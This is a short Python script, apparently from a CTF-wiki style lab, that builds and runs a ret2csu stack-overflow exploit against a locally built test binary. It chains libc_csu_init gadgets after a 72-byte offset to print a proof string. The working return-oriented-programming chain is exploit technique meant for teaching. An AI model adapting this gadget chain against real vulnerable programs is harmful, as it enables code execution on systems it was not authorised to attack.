from common import BUILD, execute, p64, print_result, symbols

binary = BUILD / "ret2csu64"
sym = symbols(binary)
words = [
    sym["gadget_csu_pop"],
    0, 1,                         # rbx=0, rbp=1: call-table loop runs once
    sym["call_table"],            # r12: address of the function-pointer table
    1,                            # r13d -> edi: stdout file descriptor
    sym["proof_message"],         # r14 -> rsi: message address
    len(b"CTFWIKI_RET2CSU_OK\n"), # r15 -> rdx: message length
    sym["gadget_ret"],            # stack alignment before the indirect call
    sym["gadget_csu_call"],
    0, 0, 0, 0, 0, 0, 0,         # cleanup: skipped word + six popped registers
    sym["gadget_ret"],
    sym["finish"],
]
payload = b"A" * 72 + b"".join(p64(word) for word in words)
print(
    f"[ret2csu] offset=72, pop=0x{sym['gadget_csu_pop']:x}, "
    f"call=0x{sym['gadget_csu_call']:x}, table=0x{sym['call_table']:x}"
)
status, output = execute(binary, [payload])
print_result("ret2csu", status, output, "CTFWIKI_RET2CSU_OK")
